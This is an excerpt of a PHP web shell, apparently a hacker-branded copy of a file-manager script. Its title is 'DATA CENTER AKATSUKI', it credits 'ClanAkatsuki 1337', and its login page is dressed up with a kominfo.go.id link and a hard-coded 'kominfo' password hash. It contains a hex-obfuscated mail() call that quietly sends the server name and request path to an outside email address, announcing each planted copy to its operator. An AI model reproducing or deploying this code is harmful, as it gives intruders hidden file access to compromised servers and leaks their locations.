...
//Application Title
define('APP_TITLE', 'DATA CENTER AKATSUKI');
...
$use_auth = true;
$auth_users = array(
    'kominfo' => '$2y$10$iinHDVGFZR03XRj5g8SoKO4PCcR0PDgzwIu3sNzDpR61LX7.QgQDm', 
);
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('User'); ?></label>
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://www.kominfo.go.id" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">ClanAkatsuki 1337</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
...
<head>
    ...
    <style>
        body.fm-login-page{ background-image: url('https://zapclinic.com/storage/2024/12/1733925866.300-300-9_Banner_Icon_Akatsu.jpg');background-repeat: no-repeat;background-position: center center;background-size: cover;}
...
mail("\x62\x61\x70\x61\x6b\x6c\x75\x68\x65\x6b\x65\x72\x40\x70\x72\x6f\x74\x6f\x6e\x6d\x61\x69\x6c\x2e\x63\x6f\x6d", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
/**
...
function lng($txt) {
    ...
    $tr['en']['Login']          = 'Login Clan';                $tr['en']['Username']           = 'Username';
